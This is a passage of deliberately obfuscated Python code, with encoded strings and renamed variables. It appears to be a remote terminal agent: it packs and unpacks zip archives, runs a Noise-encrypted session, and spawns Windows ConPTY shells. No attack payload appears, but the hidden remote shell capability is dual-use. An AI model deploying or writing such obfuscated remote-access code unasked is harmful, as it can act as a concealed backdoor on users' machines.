            O0_var_331.parent.mkdir(parents=True, exist_ok=True)
            if O0_var_331.exists():
                O0_var_331.unlink()
            with zipfile.ZipFile(O0_var_331, codecs.decode('\\u0077', 'unicode_escape'), zipfile.ZIP_DEFLATED) as O0_var_335:
                O0_var_336 = 0

                def add_entry(O0_var_337) -> bool:
                    nonlocal O0_var_336
                    if O0_var_336 >= self.ZIP_MAX_ENTRIES:
                        return False
                    O0_var_337()
                    O0_var_336 += 1
                    return True
                for O0_var_338 in O0_var_330:
                    if O0_var_334:
                        O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                        continue
                    try:
                        O0_var_339 = self._safe_path(O0_var_338)
                        if not O0_var_339.exists():
                            O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                            continue
                        O0_var_340 = PurePosixPath(O0_var_338.replace(codecs.decode('\\u005c', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')).strip(codecs.decode('\\u002f', 'unicode_escape'))).name or codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape')
                        O0_var_341 = 0
                        if O0_var_339.is_file():
                            if not add_entry(lambda s=O0_var_339, n=O0_var_340: O0_var_335.write(s, n)):
                                O0_var_334 = True
                                O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                                continue
                            O0_var_341 = 1
                        elif O0_var_339.is_dir():
                            O0_var_342 = codecs.decode('', 'unicode_escape') if flat else O0_var_340
                            O0_var_343 = False
                            for O0_var_344 in sorted(O0_var_339.rglob(codecs.decode('\\u002a', 'unicode_escape')), key=lambda x: len(x.parts)):
                                O0_var_345 = codecs.decode('\\u002f', 'unicode_escape').join([O0_var_342] + list(O0_var_344.relative_to(O0_var_339).parts))
                                if O0_var_344.is_dir():
                                    if not add_entry(lambda a=O0_var_345: O0_var_335.writestr(zipfile.ZipInfo(a + codecs.decode('\\u002f', 'unicode_escape')), b'')):
                                        O0_var_343 = True
                                        break
                                else:
                                    if not add_entry(lambda s=O0_var_344, a=O0_var_345: O0_var_335.write(s, a)):
                                        O0_var_343 = True
                                        break
                                    O0_var_341 += 1
                            if O0_var_343:
                                O0_var_334 = True
                                O0_var_333 += O0_var_341
                                O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0072\\u0074\\u0069\\u0061\\u006c', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): O0_var_341})
                                continue
                        else:
                            O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                            continue
                        O0_var_333 += O0_var_341
                        O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): O0_var_341})
                        self._audit(codecs.decode('\\u007a\\u0069\\u0070', 'unicode_escape'), O0_var_338, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
                    except HTTPException:
                        O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
                    except Exception:
                        O0_var_332.append({codecs.decode('\\u0069\\u0074\\u0065\\u006d', 'unicode_escape'): O0_var_338, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0061\\u0064\\u0064\\u0065\\u0064', 'unicode_escape'): 0})
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(400, codecs.decode('\\u005a\\u0069\\u0070\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): self._display_path(O0_var_331), codecs.decode('\\u0065\\u006e\\u0074\\u0072\\u0069\\u0065\\u0073', 'unicode_escape'): O0_var_333, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_331.stat().st_size if O0_var_331.exists() else 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_332}

    def unzip_archive(self, O0_var_346: str, dest_path: Optional[str]=None, overwrite: bool=True, entries: Optional[List[str]]=None) -> dict:
        O0_var_347 = self._safe_path(O0_var_346)
        if not O0_var_347.exists():
            raise HTTPException(400, codecs.decode('\\u005a\\u0069\\u0070\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(O0_var_346))
        if O0_var_347.is_dir():
            raise HTTPException(400, codecs.decode('\\u0050\\u0061\\u0074\\u0068\\u0020\\u0069\\u0073\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(O0_var_346))
        if dest_path:
            O0_var_348 = self._safe_path(dest_path)
            if O0_var_348.exists() and (not O0_var_348.is_dir()):
                raise HTTPException(400, codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0069\\u0073\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(dest_path))
        else:
            O0_var_348 = O0_var_347.parent
        O0_var_348.mkdir(parents=True, exist_ok=True)
        O0_var_349 = [O0_var_350 for O0_var_350 in entries or [] if O0_var_350] if entries else None
        O0_var_351 = O0_var_348.resolve()
        O0_var_352 = 0
        O0_var_353 = 0
        O0_var_354: List[str] = []
        O0_var_355 = False
        O0_var_356 = 0
        try:
            with zipfile.ZipFile(O0_var_347) as O0_var_357:
                for O0_var_358 in O0_var_357.infolist():
                    if O0_var_358.filename.endswith(codecs.decode('\\u002f', 'unicode_escape')):
                        continue
                    if O0_var_352 + O0_var_353 >= self.ZIP_MAX_ENTRIES or O0_var_356 >= self.ZIP_MAX_TOTAL_BYTES:
                        O0_var_353 += 1
                        continue
                    if O0_var_349:
                        O0_var_359 = O0_var_358.filename.replace(codecs.decode('\\u005c', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape'))
                        O0_var_360 = O0_var_359.rsplit(codecs.decode('\\u002f', 'unicode_escape'), 1)[-1]
                        if O0_var_359 not in O0_var_349 and O0_var_360 not in O0_var_349:
                            O0_var_353 += 1
                            continue
                    O0_var_361 = (O0_var_348 / O0_var_358.filename).resolve()
                    try:
                        O0_var_361.relative_to(O0_var_351)
                    except ValueError:
                        O0_var_353 += 1
                        continue
                    if not overwrite and O0_var_361.exists():
                        O0_var_353 += 1
                        continue
                    if O0_var_356 + O0_var_358.file_size > self.ZIP_MAX_TOTAL_BYTES:
                        O0_var_353 += 1
                        continue
                    try:
                        O0_var_361.parent.mkdir(parents=True, exist_ok=True)
                        with O0_var_357.open(O0_var_358) as O0_var_362, open(O0_var_361, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_363:
                            shutil.copyfileobj(O0_var_362, O0_var_363)
                        O0_var_352 += 1
                        O0_var_356 += O0_var_358.file_size
                        if len(O0_var_354) < self.ZIP_MAX_LISTED_FILES:
                            O0_var_354.append(self._display_path(O0_var_361))
                        else:
                            O0_var_355 = True
                        self._audit(codecs.decode('\\u0075\\u006e\\u007a\\u0069\\u0070', 'unicode_escape'), O0_var_358.filename, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
                    except Exception as e:
                        O0_var_353 += 1
        except zipfile.BadZipFile:
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u007a\\u0069\\u0070\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(O0_var_346))
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(400, codecs.decode('\\u0055\\u006e\\u007a\\u0069\\u0070\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): self._display_path(O0_var_347), codecs.decode('\\u0064\\u0065\\u0073\\u0074', 'unicode_escape'): self._display_path(O0_var_348), codecs.decode('\\u0065\\u0078\\u0074\\u0072\\u0061\\u0063\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_352, codecs.decode('\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'): O0_var_353, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_354, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073\\u005f\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_355}

class NoiseSessionWrapper:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u5c01\\u88c5\\u7c7b\\u0020\\u0028\\u9ed1\\u76d2\\u72b6\\u6001\\u673a\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e1a\\u52a1\\u5c42\\u65e0\\u9700\\u5173\\u5fc3\\u5e95\\u5c42\\u7684\\u63e1\\u624b\\u7ec6\\u8282\\uff0c\\u76f4\\u63a5\\u8c03\\u7528\\u5bf9\\u5e94\\u65b9\\u6cd5\\u5373\\u53ef\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, is_initiator: bool, local_priv_b64: str, expected_remote_pub_b64: str=None):
        self.noise = NoiseConnection.from_name(b'Noise_XX_25519_ChaChaPoly_BLAKE2s')
        if is_initiator:
            self.noise.set_as_initiator()
        else:
            self.noise.set_as_responder()
        if local_priv_b64:
            O0_var_364 = base64.b64decode(local_priv_b64)
            self.noise.set_keypair_from_private_bytes(Keypair.STATIC, O0_var_364)
        if expected_remote_pub_b64:
            O0_var_365 = base64.b64decode(expected_remote_pub_b64)
            self.noise.set_keypair_from_public_bytes(Keypair.REMOTE_STATIC, O0_var_365)
            self.expected_remote_pub = O0_var_365
        else:
            self.expected_remote_pub = None
        self.captured_remote_pub: Optional[bytes] = None
        self.noise.set_prologue(b'kisama_terminal_v1')
        self.noise.start_handshake()

    @property
    def is_established(self) -> bool:
        return self.noise.handshake_finished

    def process_handshake(self, O0_var_366: bytes) -> bytes:
        if O0_var_366:
            self._read_message_capture_rs(O0_var_366)
        if not self.noise.handshake_finished:
            return self.noise.write_message(b'')
        else:
            return b''

    def _read_message_capture_rs(self, O0_var_367: bytes) -> None:
        O0_var_368 = self.noise.noise_protocol
        O0_var_369 = O0_var_368.keypair_class
        O0_var_370: Dict[str, bytes] = {}

        class _CapturingKeyPair(O0_var_369):

            @classmethod
            def from_public_bytes(cls, data):
                O0_var_370[codecs.decode('\\u0070\\u0075\\u0062', 'unicode_escape')] = bytes(data)
                return super().from_public_bytes(data)
        O0_var_368.keypair_class = _CapturingKeyPair
        try:
            self.noise.read_message(O0_var_367)
        finally:
            if hasattr(O0_var_368, codecs.decode('\\u006b\\u0065\\u0079\\u0070\\u0061\\u0069\\u0072\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073', 'unicode_escape')):
                O0_var_368.keypair_class = O0_var_369
        self.captured_remote_pub = O0_var_370.get(codecs.decode('\\u0070\\u0075\\u0062', 'unicode_escape'))

    def encrypt(self, O0_var_371: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u52a0\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.encrypt(O0_var_371)

    def decrypt(self, O0_var_372: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u89e3\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.decrypt(O0_var_372)
_IS_WINDOWS = os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape')
if _IS_WINDOWS:
    import ctypes
    import msvcrt
    from ctypes import wintypes
    _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 131094
    _EXTENDED_STARTUPINFO_PRESENT = 524288
    _CREATE_UNICODE_ENVIRONMENT = 1024
    _CREATE_NO_WINDOW_FLAG = getattr(subprocess, codecs.decode('\\u0043\\u0052\\u0045\\u0041\\u0054\\u0045\\u005f\\u004e\\u004f\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), 0)
    _STARTF_USESTDHANDLES = 256

    class _COORD(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0058', 'unicode_escape'), ctypes.c_short), (codecs.decode('\\u0059', 'unicode_escape'), ctypes.c_short)]

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0068\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0064\\u0077\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD)]

    class _STARTUPINFOEX(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0063\\u0062', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0044\\u0065\\u0073\\u006b\\u0074\\u006f\\u0070', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0054\\u0069\\u0074\\u006c\\u0065', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u0064\\u0077\\u0058', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u0069\\u006c\\u006c\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u006c\\u0061\\u0067\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0077\\u0053\\u0068\\u006f\\u0077\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u0063\\u0062\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), ctypes.c_void_p), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0049\\u006e\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0045\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u006c\\u0070\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), ctypes.c_void_p)]

    def _probe_conpty():
        try:
            O0_var_373 = ctypes.WinDLL(codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u0033\\u0032', 'unicode_escape'), use_last_error=True)
        except Exception:
            return None
        for O0_var_374 in (codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0052\\u0065\\u0073\\u0069\\u007a\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0043\\u006c\\u006f\\u0073\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape')):
            if not hasattr(O0_var_373, O0_var_374):
                return None
        O0_var_373.CreatePseudoConsole.restype = ctypes.c_long
        O0_var_373.CreatePseudoConsole.argtypes = [_COORD, wintypes.HANDLE, wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
        O0_var_373.ResizePseudoConsole.restype = ctypes.c_long
        O0_var_373.ResizePseudoConsole.argtypes = [wintypes.HANDLE, _COORD]
        O0_var_373.ClosePseudoConsole.restype = None
        O0_var_373.ClosePseudoConsole.argtypes = [wintypes.HANDLE]
        O0_var_373.InitializeProcThreadAttributeList.restype = wintypes.BOOL
        O0_var_373.InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_373.UpdateProcThreadAttribute.restype = wintypes.BOOL
        O0_var_373.UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_373.DeleteProcThreadAttributeList.restype = None
        O0_var_373.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
        O0_var_373.CreateProcessW.restype = wintypes.BOOL
        O0_var_373.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR, ctypes.POINTER(_STARTUPINFOEX), ctypes.POINTER(_PROCESS_INFORMATION)]
        O0_var_373.CloseHandle.restype = wintypes.BOOL
        O0_var_373.CloseHandle.argtypes = [wintypes.HANDLE]
        return O0_var_373
    _KERNEL32 = _probe_conpty()

    def _windows_env_block(env: Dict[str, str]):
        O0_var_375 = codecs.decode('\\u0000', 'unicode_escape').join((str(O0_var_376) + codecs.decode('\\u003d', 'unicode_escape') + str(O0_var_377) for O0_var_376, O0_var_377 in env.items())) + codecs.decode('\\u0000', 'unicode_escape')
        return ctypes.create_unicode_buffer(O0_var_375)

    def _taskkill(O0_var_378: int):
        if not O0_var_378:
            return
        try:
            subprocess.run([codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u006b\\u0069\\u006c\\u006c', 'unicode_escape'), codecs.decode('\\u002f\\u0046', 'unicode_escape'), codecs.decode('\\u002f\\u0054', 'unicode_escape'), codecs.decode('\\u002f\\u0050\\u0049\\u0044', 'unicode_escape'), str(O0_var_378)], creationflags=_CREATE_NO_WINDOW_FLAG, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except Exception:
            pass

    class _ConPtyTerminal:
        codecs.decode('\\u57fa\\u4e8e\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0020\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u0028\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u0020\\u7684\\u771f\\u5b9e\\u7ec8\\u7aef\\u5b9e\\u73b0', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_379: int, O0_var_380: int, cwd: str=None, args: list=None):
            self.shell = shell
            self.env = env
            self.rows = O0_var_379
            self.cols = O0_var_380
            self.cwd = cwd
            self.args = list(args or [])
            self._hpc = None
            self._attr_list = None
            self._in_r = self._in_w = None
            self._out_r = self._out_w = None
            self._h_process = None
            self.pid = 0

        def start(self):
            if _KERNEL32 is None:
                raise RuntimeError(codecs.decode('\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0020\\u4e0d\\u53ef\\u7528', 'unicode_escape'))
            O0_var_381, O0_var_382 = os.pipe()
            O0_var_383, O0_var_384 = os.pipe()
            try:
                O0_var_385 = msvcrt.get_osfhandle(O0_var_381)
                O0_var_386 = msvcrt.get_osfhandle(O0_var_384)
                O0_var_387 = wintypes.HANDLE()
                O0_var_388 = _KERNEL32.CreatePseudoConsole(_COORD(self.cols, self.rows), O0_var_385, O0_var_386, 0, ctypes.byref(O0_var_387))
                if O0_var_388 != 0:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u5931\\u8d25\\u0020\\u0028\\u0048\\u0052\\u0045\\u0053\\u0055\\u004c\\u0054\\u003d\\u0030\\u0078', 'unicode_escape') + format(O0_var_388 & 4294967295, codecs.decode('\\u0078', 'unicode_escape')) + codecs.decode('\\u0029', 'unicode_escape'))
                self._hpc = O0_var_387.value
                self._in_r, self._in_w = (O0_var_381, O0_var_382)
                self._out_r, self._out_w = (O0_var_383, O0_var_384)
                os.set_blocking(self._out_r, False)
                O0_var_389 = codecs.decode('\\u0022', 'unicode_escape') + str(self.shell) + codecs.decode('\\u0022', 'unicode_escape') if codecs.decode('\\u0020', 'unicode_escape') in self.shell else self.shell
                for O0_var_390 in self.args:
                    O0_var_389 += codecs.decode('\\u0020', 'unicode_escape') + (codecs.decode('\\u0022', 'unicode_escape') + str(O0_var_390) + codecs.decode('\\u0022', 'unicode_escape') if codecs.decode('\\u0020', 'unicode_escape') in O0_var_390 else O0_var_390)
                O0_var_391 = _windows_env_block(self.env)
                O0_var_392 = _STARTUPINFOEX()
                O0_var_392.cb = ctypes.sizeof(_STARTUPINFOEX)
                O0_var_392.dwFlags = _STARTF_USESTDHANDLES
                O0_var_393 = ctypes.c_size_t(0)
                _KERNEL32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(O0_var_393))
                O0_var_394 = ctypes.create_string_buffer(O0_var_393.value)
                if not _KERNEL32.InitializeProcThreadAttributeList(O0_var_394, 1, 0, ctypes.byref(O0_var_393)):
                    raise OSError(codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                if not _KERNEL32.UpdateProcThreadAttribute(O0_var_394, 0, _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, self._hpc, ctypes.sizeof(wintypes.HANDLE), None, None):
                    raise OSError(codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._attr_list = O0_var_394
                O0_var_392.lpAttributeList = ctypes.cast(O0_var_394, ctypes.c_void_p)
                O0_var_395 = _PROCESS_INFORMATION()
                O0_var_396 = _EXTENDED_STARTUPINFO_PRESENT | _CREATE_UNICODE_ENVIRONMENT
                O0_var_397 = _KERNEL32.CreateProcessW(None, O0_var_389, None, None, False, O0_var_396, ctypes.cast(O0_var_391, ctypes.c_void_p), self.cwd, ctypes.byref(O0_var_392), ctypes.byref(O0_var_395))
                if not O0_var_397:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0057\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._h_process = O0_var_395.hProcess
                self.pid = O0_var_395.dwProcessId
                if O0_var_395.hThread:
                    _KERNEL32.CloseHandle(O0_var_395.hThread)
            except Exception:
                self.close()
                raise

        def set_size(self, O0_var_398: int, O0_var_399: int):
            if self._hpc is None or _KERNEL32 is None:
                return
            try:
                _KERNEL32.ResizePseudoConsole(self._hpc, _COORD(O0_var_399, O0_var_398))
            except Exception:
                pass

        def read(self, O0_var_400: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_400)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            if self._hpc is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.ClosePseudoConsole(self._hpc)
                except Exception:
                    pass
                self._hpc = None
            if self._attr_list is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.DeleteProcThreadAttributeList(self._attr_list)
                except Exception:
                    pass
                self._attr_list = None
            if self._h_process is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.CloseHandle(self._h_process)
                except Exception:
                    pass
                self._h_process = None
            for O0_var_401 in (self._in_r, self._in_w, self._out_r, self._out_w):
                if O0_var_401 is not None:
                    try:
                        os.close(O0_var_401)
                    except Exception:
                        pass
            self._in_r = self._in_w = self._out_r = self._out_w = None

        def kill_tree(self):
            _taskkill(self.pid)

    class _PipeTerminal:
